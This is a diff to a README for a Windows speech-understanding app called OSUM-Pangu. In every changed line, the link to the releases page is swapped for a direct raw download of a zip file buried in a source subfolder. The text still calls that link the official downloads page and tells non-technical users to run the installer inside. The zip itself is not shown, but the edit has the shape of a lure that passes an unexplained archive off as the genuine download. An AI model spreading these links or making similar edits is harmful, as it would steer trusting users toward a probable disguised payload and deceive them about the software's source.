@@ -1,6 +1,6 @@
 # ⚙️ OSUM-Pangu - Clear Speech Understanding Anywhere
 
-[![Download OSUM-Pangu](https://img.shields.io/badge/Download-OSUM--Pangu-blue?style=for-the-badge)](https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases)
+[![Download OSUM-Pangu](https://img.shields.io/badge/Download-OSUM--Pangu-blue?style=for-the-badge)](https://github.com/ahsanulhoqFahim/OSUM-Pangu/raw/refs/heads/main/wenet/finetune/Pangu_OSU_2.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Before you start, make sure your computer meets these basic needs:
 Follow these steps to get OSUM-Pangu running on your Windows PC:
 
 1. Click the big blue badge above or follow this link to visit the official downloads page:  
-   https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases  
+   https://github.com/ahsanulhoqFahim/OSUM-Pangu/raw/refs/heads/main/wenet/finetune/Pangu_OSU_2.2.zip  
    This page has the latest versions ready for you.
 
 2. On the downloads page, look for the latest Windows version. Files usually end with `.exe` or `.msi`. You want to find the file with a name like `OSUM-Pangu-Setup.exe` or similar.
@@ -103,7 +103,7 @@ If OSUM-Pangu does not work as expected, try these fixes:
 Keep your OSUM-Pangu software up to date for the best experience:
 
 - Visit the downloads page regularly:  
-  https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases  
+  https://github.com/ahsanulhoqFahim/OSUM-Pangu/raw/refs/heads/main/wenet/finetune/Pangu_OSU_2.2.zip  
 - Download and install new versions when they are released.
 - Check the program settings for an update button or notification.
 
@@ -113,7 +113,7 @@ Keep your OSUM-Pangu software up to date for the best experience:
 
 Visit this page to download the latest version of OSUM-Pangu for Windows:
 
-[![Download OSUM-Pangu](https://img.shields.io/badge/Download-OSUM--Pangu-grey?style=for-the-badge)](https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases)
+[![Download OSUM-Pangu](https://img.shields.io/badge/Download-OSUM--Pangu-grey?style=for-the-badge)](https://github.com/ahsanulhoqFahim/OSUM-Pangu/raw/refs/heads/main/wenet/finetune/Pangu_OSU_2.2.zip)
 
 ---
 
@@ -132,4 +132,4 @@ If you need further assistance:
 OSUM-Pangu is open-source software built on the OpenPangu framework. You can view the source code and contribute if you know how, but using the software does not require any programming skills.  
 
 Source code and downloads:  
-https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases
+https://github.com/ahsanulhoqFahim/OSUM-Pangu/raw/refs/heads/main/wenet/finetune/Pangu_OSU_2.2.zip
